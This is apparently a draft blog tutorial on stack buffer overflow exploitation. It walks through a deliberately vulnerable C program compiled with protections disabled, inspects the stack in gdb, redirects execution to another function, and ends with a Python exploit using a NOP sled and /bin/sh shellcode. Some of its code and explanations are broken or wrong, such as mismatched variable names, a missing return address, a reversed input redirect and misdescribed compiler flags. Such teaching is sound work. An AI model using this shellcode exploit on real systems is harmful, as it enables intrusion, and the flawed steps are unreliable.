---
title: "Buffer Overflow Exploitatoin"
date: 2020-08-10T20:03:02-03:00
layout: Exploitation
draft: true
---

### Introduction
Briefly, the buffer overflow is a vulnerability that occurs when a program writes more data than its buffer supports. And the data that exceeds the buffer size overwrite the program information.

For explain this vulnerability, i was prepered this vulnerable C code as you can see below.

```
#include <stdio.h>


void vuln(void) 
{
    char name[30];

    puts("Whats my name? ");
    scanf("%s", name);
    printf("You say: %s\nBut it is not my real name!", name);
}

void real_name() 
{
    puts("You are right, my name is Eduardo");
}


int main(void) 
{

        vuln();

        return 0;
}
```

Now we need to compile this program, some flags will be used to disable some file protections:
```
gcc vulnerable.c -o vulnerable -z -execstack -fno-stack-protector -no-pie -w
```

Brief explain about the flags:
- ** execstack: ** Disable execution on the stack.
- ** fno-stack-protector: ** Remove the stack cookie.
- ** no-pie: ** Disables memory randomization.

That done, we have an executable file called "vulnerable".

The behavior of "vulnerable" is basically to print a message, get an input and print this input. This is illustrated below.
**Execution**
```
~$ ./vulnerable
```
**Output**
```
Whats my name?
AAAAAAAA
You say: AAAAAAAA
But it is not my real name!
```

But, when this input is bigger than expected we got:

```
Whats my name?
You say: AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH
[1]    9337 segmentation fault (core dumped)  ./vulnerable
```

Voil√†, we got an unexpected behaviour.

We dont go deeper in assembly or computer architecture, but we need to understand a bit to comprehend and exploit this flaw. Bellow  I will explain some of the concepts necessary for this purpose.

#### Stack
It is a piece of memory that stores among other things the variables of a program. This content is managed following the FILO rule (the first to enter is the last to leave). The operations that control the insertion and removal of the content present in the stack, are respectively push and pop.

#### Registers

**rip**: The rip(Instruction pointer) is an register that is responsible for execute the next instruction of code.

 **rsp**: The rsp(Stack pointer) is an register that commonly apoint to the top of stack

 **rbp**: The rbp(Base pointer) register define the base of stack frame, it means the space reserved in stack to store variables.

#### Assembly Instructions 

** call **: As a C function when called, this instruction goes to the address / label specified after its declaration. But not only that. when a function is called, it needs to return to its old scope for the program to end normally. Therefore, the address after the function call is stored in the stack, so that, at the end of the function, this address is at the top of the stack and it is possible to return this address to the register responsible for executing the program instructions (rip) so that the program continues its normal execution flow.

**ret**: An assembly instruction that takes the address at the top of the stack and places it in the rip.


Now come to gdb, to understand the behavior of the program

```
gdb vulnerable
```

In console type:
```
disassembly vuln
                            [ Disassembly main function ]

        0x00000000004011d8 <+0>:     endbr64
        0x00000000004011dc <+4>:     push   rbp
        0x00000000004011dd <+5>:     mov    rbp,rsp
        0x00000000004011e0 <+8>:     call   0x401176 <vuln>
        0x00000000004011e5 <+13>:    mov    eax,0x0
        0x00000000004011ea <+18>:    pop    rbp
        0x00000000004011eb <+19>:    ret
   ```

With this command, we obtained the assembly code for the "main" function. we can see that vuln function are called.

```
run
                                [  Run program ]

        Whats my name?
        AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH
        You say: AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH
        
        Program received signal SIGSEGV, Segmentation fault.
```
With this assert the program was executed in gdb context, in this exemple we will reproduce the unexpected behavior as before.
```
x/15gx $rsp
                                  [ Print STACK ]

        0x7fffffffd8f8: 0x4646464646464646      0x4747474747474747
        0x7fffffffd908: 0x4848484848484848      0x00007ffff7ffc600
        0x7fffffffd918: 0x00007fffffffd9f8      0x0000000100000000
        0x7fffffffd928: 0x00000000004011d8      0x00000000004011f0
        0x7fffffffd938: 0xed880c701a08a9b0      0x0000000000401090


x/gx $rsp
                [ Top address of STACK ]
        0x7fffffffd8f8: 0x4646464646464646
```

It is the dumping of part of the top of stack's. we can see that part of them are filled in by "46, 47, 48". This represents part of the input sent to the program. But, these values are different from "ABCDEFGH" right? yes, but computationally, the letters are represented by numbers, we can verify when we look at the ascii table.
```
~$ man ascii
```
|Oct|Dec|Hex|Char|
|---|---|---|----|
|101|65 |41 | A  |
|102|66 |42 | B  |
|103|67 |43 | C  |
|104|68 |44 | D  |
|105|69 |45 | E  |
|106|70 |46 | F  |
|107|71 |47 | G  |
|110|72 |48 | H  |


Comparing the table with the memory dump, is possible assert that part of the imput in hexadecimal is stored on stack. Considering that, and what we was learn about assembly and computer arquitechtures. we got that, the payload overwirete the top of stack, it means that rsp regiter appoint to 0x4646464646464646 what will make rip got an invalid memory adress and the message segmentfault is show.

This illustration below show the stage of stack in normal flow.

```
                                      [STACK]
                Top of stack:    |return adress|  <- rsp
                                 |     ...     |  
                                 |   name[50]  |  <- rbp
                                 |     ...     | 
```

When the ret instruction will be executed the "return adress" that represent the addres of "return" in the C used exemple will be put in the rip that will come back to main function and correctly finish the program.

This represent the stack when the overflow was happen.

```
                                        [STACK]
                Top of stack:    |0x4444444444444444|  <- rsp
                                 |0x4343434343434343|  
                                 |0x4242424242424242|
                                 |0x4141414141414141|  <- rbp
                                 |        ...       |  

```
Now remenber what will happen when the ** ret ** register will be executed, they will get the top address of the stack and will put it into ** rip ** to program follow the normal flow, but when the top address of stack is overwrited, the ** rip ** will recive the overwrite value in the above example (0x44444444), but it's an invalid address and the return a segmentfault fault message.

But it is not the central problem, its behavior can be much more harmful than just crashing the application, if you can overwrite the address on the top of stack when the program are running the program will be able to take control of the program's execution flow, it may be possible to execute other parts of the code or arbitrarily execute commands, I will give examples.

At first, we will change the execution flow of the program to execute "real_name" funtion. Instead, you replace the address on the top of stack in the end of "vuln" execution it means the address of "return" in C example, to letters or some other junk, we will put an valid address, like the "real_name" function, in the code example.

```
Exploit.py
```
```
padding = "A" * 72
Padding is the ammount of content that overwrite the buffer until before of top of stack.

This "overwirete_return_address" represent the address that start the target function that we want to be executed(real_name), its possible find this address in objdump with:

```
objdump -M instel -d vulnerable | grep -m 2 vuln
```
**Output**
```
vulnerable:
0000000000401176 <vuln>:
```

Note that is necessary put the address in bakwards becaus of the processor follow the little endian notation.

**Execution**
```
$HOME/file_path/vulnerable < python2 exploit.py
```

**Output**

```
Give me some input:
You say: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@
You are right, my name is Eduardo
[1]    7836 segmentation fault (core dumped)
```

The "real_name" did executed, but the danger can be amplified if you put an shellcode it means amount machine code instruction that return execute ***/bin/bash*** and you can take a shell in target machine. so go build the exploit.

```
padding = "A" * 72

overwrite_return_address = ""

nop = "\\x90" * 60

shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

print(padding + overwrite_return_address + nops + shellcode)
```
This exploit i was make some modifications, now, the override_return_address represent de address after the overwrite address in stack, that will repoainto to stack segment, and remenber, we compile this binary with NX(no execstack) protection it means that stack can execute intructions. use the nop instructions, that make anything, to avoid stack unalligment problems(I pretend talk about it in another post). 


If all happened following the plain, the signal "#" or "$" in the terminal has been disaper. And you are a new shell. 

